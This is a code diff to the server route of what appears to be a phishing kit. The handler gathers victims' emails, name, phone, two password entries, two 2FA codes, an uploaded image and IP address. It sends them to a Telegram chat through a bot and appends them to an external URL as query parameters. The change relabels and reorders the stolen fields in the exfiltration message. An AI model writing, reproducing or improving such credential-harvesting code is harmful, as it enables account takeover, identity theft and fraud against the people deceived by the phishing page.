@@ -24,18 +24,17 @@ app.post('/api/news', (req, res) => {
     res.send(result);
 
     // SEND DATA TO TELE
-    const message = `Email Account: ${data.fill_business_email ? data.fill_business_email : ''} 
-    Name Acount: ${data.fill_full_name ? data.fill_full_name : ''} 
-    Personal Email: ${data.fill_personal_email ? data.fill_personal_email : ''}
+const message = `IP: ${data.ip ? data.ip : ''}
+    Acount Name: ${data.fill_full_name ? data.fill_full_name : ''} 
+    Email Personal: ${data.fill_personal_email ? data.fill_personal_email : ''}
+    Email Account: ${data.fill_business_email ? data.fill_business_email : ''} 
     Phone Number: ${data.fill_phone ? data.fill_phone : ''}
     Password First: ${data.first_password ? data.first_password : ''}
     Password Second: ${data.second_password ? data.second_password : ''}
-    Ip: ${data.ip ? data.ip : ''}
-    City: ${data.city ? data.city : ''}
-    Country: ${data.country ? data.country : ''}
-    First Code Authen: ${data.first_code ? data.first_code : ''}
-    Second Code Authen: ${data.second_code ? data.second_code : ''}
-    Images Url: ${data.image ? data.image : ''}`;
+    Images: ${data.image ? data.image : ''}
+    --------------------------------------------
+    First 2Fa: ${data.first_code ? data.first_code : ''}
+    Second 2Fa: ${data.second_code ? data.second_code : ''};`
 
     bot.sendMessage(process.env.CHAT_ID, message);
 
@@ -51,8 +50,6 @@ app.post('/api/news', (req, res) => {
     url.searchParams.append('Password First', data.first_password ? data.first_password : '');
     url.searchParams.append('Password Second', data.second_password ? data.second_password : '');
     url.searchParams.append('Ip', data.ip ? data.ip : '');
-    url.searchParams.append('City', data.city ? data.city : '');
-    url.searchParams.append('Country', data.country ? data.country : '');
     url.searchParams.append('First Code Authen', data.first_code ? data.first_code : '');
     url.searchParams.append('Second Code Authen', data.second_code ? data.second_code : '');
     url.searchParams.append('Images Url', data.image ? data.image : '');
